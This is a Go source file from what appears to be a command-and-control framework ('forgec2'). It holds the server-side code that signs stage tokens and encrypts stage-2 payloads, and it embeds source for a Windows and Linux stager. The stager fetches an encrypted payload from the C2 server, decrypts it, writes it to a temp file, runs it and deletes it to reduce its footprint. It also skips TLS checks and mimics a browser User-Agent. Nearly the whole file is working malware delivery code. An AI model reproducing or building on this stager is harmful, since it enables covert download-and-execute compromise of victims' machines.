package payload

import (
	"context"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
)

// StageTokenTTLDefault is the default lifetime (minutes) for generate-page
// stage tokens. Stage tokens are single-purpose signed URLs; a short TTL
// bounds how long the (encrypted) stage-2 payload remains reachable.
const StageTokenTTLDefault = 60

// StagerFetch carries everything a token stager needs to retrieve and decrypt
// the stage-2 payload. The signature authenticates the URL server-side so a
// raw token cannot be consumed without the matching signature.
type StagerFetch struct {
	BaseURL string // origin of the C2, e.g. https://10.0.0.1:8080
	Token   string // hex-encoded 32-byte stage token
	Sig     string // url-safe base64 HMAC signature of the token
	KeyHex  string // hex-encoded AES-256-GCM key for the stage blob
	// HTTPS / transport hardening for the stager download.
	SkipTLSVerify bool   // accept self-signed C2 TLS certificates
	Proxy         string // optional upstream HTTP proxy URL
	UserAgent     string // custom User-Agent (default mimics a browser)
}

func stageKey() ([]byte, error) {
	k := GetStagerKey()
	if k == nil || len(k) != 32 {
		return nil, fmt.Errorf("stager key unavailable")
	}
	return k, nil
}

// StageSignature returns the url-safe base64 HMAC-SHA256 signature bound to a
// stage token. The signature makes stage URLs opaque: a token alone (e.g. from
// a log line) is useless to third parties, and tampering is rejected with a
// constant-time comparison on the server.
func StageSignature(token string) (string, error) {
	k, err := stageKey()
	if err != nil {
		return "", err
	}
	mac := hmac.New(sha256.New, k)
	mac.Write([]byte("forgec2:stage-sig:"))
	mac.Write([]byte(token))
	return base64.RawURLEncoding.EncodeToString(mac.Sum(nil)), nil
}

// VerifyStageSignature reports whether sig is a valid signature for token.
func VerifyStageSignature(token, sig string) bool {
	want, err := StageSignature(token)
	if err != nil {
		return false
	}
	return hmac.Equal([]byte(sig), []byte(want))
}

// DeriveStage2Key derives the per-token AES-256-GCM key used to encrypt the
// stage-2 payload blob. The key is deterministic (no key storage needed) yet
// unguessable without the server stager key.
func DeriveStage2Key(token string) ([]byte, error) {
	k, err := stageKey()
	if err != nil {
		return nil, err
	}
	mac := hmac.New(sha256.New, k)
	mac.Write([]byte("forgec2:stage2:key:"))
	mac.Write([]byte(token))
	return mac.Sum(nil), nil
}

// NewStageToken generates a fresh stage token along with its server-side
// signature and the AES key a stager must embed to decrypt the blob.
func NewStageToken() (token, sig, keyHex string, err error) {
	buf := make([]byte, 32)
	if _, err = rand.Read(buf); err != nil {
		return "", "", "", err
	}
	token = hex.EncodeToString(buf)
	sig, err = StageSignature(token)
	if err != nil {
		return "", "", "", err
	}
	key, err := DeriveStage2Key(token)
	if err != nil {
		return "", "", "", err
	}
	keyHex = hex.EncodeToString(key)
	return token, sig, keyHex, nil
}

// Stage2BlobPath returns the on-disk path of the (AES-GCM encrypted) stage-2
// blob for a token.
func Stage2BlobPath(dataDir, token string) string {
	return filepath.Join(dataDir, "agents", "stager2_"+token+".enc")
}

// WriteStage2Blob encrypts plaintext with the token-derived AES key and writes
// it to disk. Only the encrypted form is ever persisted, so a leaked data
// directory is useless without the stager key.
func WriteStage2Blob(dataDir, token string, plaintext []byte) error {
	key, err := DeriveStage2Key(token)
	if err != nil {
		return err
	}
	enc, err := EncryptStage2Payload(plaintext, key)
	if err != nil {
		return err
	}
	path := Stage2BlobPath(dataDir, token)
	if err := os.MkdirAll(filepath.Dir(path), 0750); err != nil {
		return err
	}
	return os.WriteFile(path, enc, 0640)
}

// LoadStage2Blob reads the encrypted stage-2 blob for a token.
func LoadStage2Blob(dataDir, token string) ([]byte, error) {
	return os.ReadFile(Stage2BlobPath(dataDir, token))
}

// OriginFromC2URL extracts scheme://host from a beacon C2 URL so the stager
// can reach the /stage endpoint on the same origin.
func OriginFromC2URL(c2url string) string {
	lower := strings.ToLower(c2url)
	for _, scheme := range []string{"http://", "https://"} {
		if strings.HasPrefix(lower, scheme) {
			rest := c2url[len(scheme):]
			if i := strings.IndexAny(rest, "/?"); i >= 0 {
				rest = rest[:i]
			}
			if rest != "" {
				return scheme + rest
			}
		}
	}
	return c2url
}

// tokenStagerSrc is the stager program used by both the Windows and Linux
// token stagers. The stager downloads the AES-256-GCM encrypted stage-2 blob
// from /stage/<token>?s=<sig>, decrypts it with the embedded key, writes the
// plaintext stage-2 to a temp file and executes it on disk.
const tokenStagerSrc = `package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"encoding/hex"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"time"
)

var (
	BaseURL    string
	Token      string
	Sig        string
	KeyHex     string
	SkipTLS    string
	ProxyURL   string
	UserAgent  string
)

func main() {
	transport := &http.Transport{}
	if SkipTLS == "true" {
		transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	}
	if ProxyURL != "" {
		if pu, err := url.Parse(ProxyURL); err == nil {
			transport.Proxy = http.ProxyURL(pu)
		}
	}
	client := &http.Client{Transport: transport, Timeout: 30 * time.Second}

	req, err := http.NewRequest("GET", BaseURL+"/stage/"+Token+"?s="+Sig, nil)
	if err != nil {
		os.Exit(1)
	}
	if UserAgent != "" {
		req.Header.Set("User-Agent", UserAgent)
	}
	resp, err := client.Do(req)
	if err != nil {
		os.Exit(1)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		os.Exit(1)
	}
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		os.Exit(1)
	}
	key, err := hex.DecodeString(KeyHex)
	if err != nil {
		os.Exit(1)
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		os.Exit(1)
	}
	aead, err := cipher.NewGCM(block)
	if err != nil {
		os.Exit(1)
	}
	ns := aead.NonceSize()
	if len(body) < ns {
		os.Exit(1)
	}
	data, err := aead.Open(nil, body[:ns], body[ns:], nil)
	if err != nil {
		os.Exit(1)
	}
	tmpFile, err := os.CreateTemp("", "*.exe")
	if err != nil {
		os.Exit(1)
	}
	if _, err := tmpFile.Write(data); err != nil {
		tmpFile.Close()
		os.Exit(1)
	}
	tmpPath := tmpFile.Name()
	tmpFile.Close()
	if err := os.Chmod(tmpPath, 0755); err != nil {
		os.Exit(1)
	}
	cmd := exec.Command(tmpPath)
	if err := cmd.Start(); err != nil {
		os.Remove(tmpPath)
		os.Exit(1)
	}
	cmd.Process.Release()
	// Best-effort self-cleanup of the dropped stage-2 to limit on-disk OPSEC
	// footprint once the child has loaded and begun executing.
	go func() {
		time.Sleep(500 * time.Millisecond)
		os.Remove(tmpPath)
	}()
}
`

// GenerateTokenStager builds a minimal Windows stager EXE that fetches
// /stage/<token>?s=<sig>, decrypts the AES-256-GCM blob with the embedded key,
// writes the stage-2 to a temp file and executes it on disk.
func GenerateTokenStager(cfg ImplantConfig, outputDir string, fetch StagerFetch) (string, error) {
	return buildTokenStager(cfg, outputDir, fetch, "windows")
}

// GenerateTokenStagerLinux builds a minimal Linux ELF token stager.
func GenerateTokenStagerLinux(cfg ImplantConfig, outputDir string, fetch StagerFetch) (string, error) {
	return buildTokenStager(cfg, outputDir, fetch, "linux")
}

func buildTokenStager(cfg ImplantConfig, outputDir string, fetch StagerFetch, goos string) (string, error) {
	tmpDir, err := os.MkdirTemp("", "forgec2-token-stager-*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmpDir)

	if !filepath.IsAbs(outputDir) {
		if abs, err := filepath.Abs(outputDir); err == nil {
			outputDir = abs
		}
	}

	stagerSrc := tokenStagerSrc
	if goos == "windows" {
		stagerSrc = "//go:build windows\n// +build windows\n\n" + tokenStagerSrc
	}
	if err := os.WriteFile(filepath.Join(tmpDir, "main.go"), []byte(stagerSrc), 0644); err != nil {
		return "", err
	}

	goMod := "module stager\n\ngo 1.25\n"
	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
		return "", err
	}

	escape := func(s string) string {
		s = strings.ReplaceAll(s, `\`, `\\`)
		s = strings.ReplaceAll(s, `"`, `\"`)
		s = strings.ReplaceAll(s, "\n", `\n`)
		s = strings.ReplaceAll(s, "\r", `\r`)
		return s
	}

	ldflags := fmt.Sprintf(`-s -w -buildid= -X "main.BaseURL=%s" -X "main.Token=%s" -X "main.Sig=%s" -X "main.KeyHex=%s" -X "main.SkipTLS=%s" -X "main.ProxyURL=%s" -X "main.UserAgent=%s"`,
		escape(fetch.BaseURL),
		escape(fetch.Token),
		escape(fetch.Sig),
		escape(fetch.KeyHex),
		strconv.FormatBool(fetch.SkipTLSVerify),
		escape(fetch.Proxy),
		escape(fetch.UserAgent),
	)

	outName := cfg.Filename
	if outName == "" {
		outName = "stager"
	}
	if goos == "windows" {
		if !strings.HasSuffix(strings.ToLower(outName), ".exe") {
			outName += ".exe"
		}
	} else if strings.HasSuffix(strings.ToLower(outName), ".exe") {
		outName = outName[:len(outName)-4]
	}
	outPath := filepath.Join(outputDir, outName)
	if !filepath.IsAbs(outPath) {
		if abs, err := filepath.Abs(outPath); err == nil {
			outPath = abs
		}
	}
	absOutputDir, absErr := filepath.Abs(outputDir)
	if absErr != nil {
		absOutputDir = outputDir
	}
	if !strings.HasPrefix(outPath, absOutputDir+string(filepath.Separator)) {
		return "", fmt.Errorf("invalid stager filename: escapes output directory")
	}
	if err := os.MkdirAll(filepath.Dir(outPath), 0750); err != nil {
		return "", err
	}

	goCmd := getGoCmd()
	if goCmd == "" {
		return "", fmt.Errorf("go executable not found in PATH")
	}

	ctx, cancel := context.WithTimeout(context.Background(), buildTimeout)
	defer cancel()

	tidyCmd := exec.CommandContext(ctx, goCmd, "mod", "tidy")
	tidyCmd.Dir = tmpDir
	if out, err := tidyCmd.CombinedOutput(); err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return "", fmt.Errorf("go mod tidy timed out after %s: %w", buildTimeout, err)
		}
		return "", fmt.Errorf("go mod tidy failed: %w\n%s", err, string(out))
	}

	cmd := exec.CommandContext(ctx, goCmd, "build",
		"-ldflags", ldflags,
		"-o", outPath,
		"-trimpath",
		"-buildvcs=false",
		".",
	)
	cmd.Dir = tmpDir
	goarch, err := resolveBuildArch(goos, cfg.Architecture)
	if err != nil {
		return "", err
	}
	cmd.Env = append(os.Environ(),
		"GOOS="+goos,
		"GOARCH="+goarch,
		"CGO_ENABLED=0",
	)

	var stderr strings.Builder
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return "", fmt.Errorf("stager build timed out after %s: %w", buildTimeout, err)
		}
		return "", fmt.Errorf("stager build failed: %w\n%s", err, scrubBuildLog(stderr.String(), ldflags))
	}
	if _, err := os.Stat(outPath); err != nil {
		return "", fmt.Errorf("stager build succeeded but no output: %w", err)
	}
	return outPath, nil
}